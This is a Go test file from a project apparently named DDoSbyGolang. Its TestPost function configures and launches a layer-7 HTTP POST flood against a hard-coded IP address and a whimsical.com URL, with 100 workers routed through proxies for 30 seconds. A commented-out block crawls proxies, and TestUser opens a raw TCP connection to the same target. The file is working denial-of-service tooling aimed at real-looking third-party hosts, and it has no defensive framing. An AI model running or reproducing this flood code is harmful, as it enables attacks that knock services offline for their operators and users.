/*
 * @Author: uyplayer
 * @Date: 2022/3/22 12:54
 * @Email: uyplayer@qq.com
 * @File: post_test.go
 * @Software: GoLand
 * @Dir: DDoSbyGolang / layer7/test
 * @Project_Name: DDoSbyGolang
 * @Description:
 */

package test

import (
	"DDoSbyGolang/layer7"
	"context"
	"fmt"
	"net"
	"sync"
	"testing"
)

func TestPost(t *testing.T) {

	// 运行爬代理
	//p := proxy.Proxy{
	//	Start:     2,
	//	End:       100,
	//	Wg:        &sync.WaitGroup{},
	//	Workernum: 50,
	//	Ch:        make(chan proxy.Workers, 50),
	//	Func:      proxy.HandleWorker,
	//	Proxy:     "161.35.161.38",
	//}
	//p.Workers()
	//p.Generator()
	//p.Wait()

	// 初始化
	l7 := layer7.Layer7{}
	l7.Target = "47.254.33.193:80"
	l7.Url = "https://whimsical.com:80/CA7f3ykvXpnJ9Az32vYXva"
	cont := context.Background()
	ctx, cancel := context.WithCancel(cont)
	l7.Context = ctx
	l7.Func = l7.POST
	l7.MaxWorkerNum = 100
	l7.Wg = &sync.WaitGroup{}
	l7.Data = make(chan layer7.Work)
	l7.Proxy = layer7.GetProxystring()
	l7.Method = "POST"
	l7.Payload = make(chan string)
	l7.RunTime = 30

	// 启动程序
	l7.Generator()
	l7.Workers()
	l7.Wait(cancel)

}

func TestUser(t *testing.T) {

	pUrl, err := net.ResolveTCPAddr("tcp4", "47.254.33.193:80")
	//proUel, err := net.ResolveTCPAddr("tcp4", work.Proxy)
	if err != nil {
		fmt.Println(" url.Parse : ", err)
	}
	// tcp连接
	fmt.Println(pUrl)
	co, err := net.DialTCP("tcp4", nil, pUrl)
	if err != nil {
		fmt.Println(" net.DialTCP : ", err)
	}
	fmt.Println(co)

}
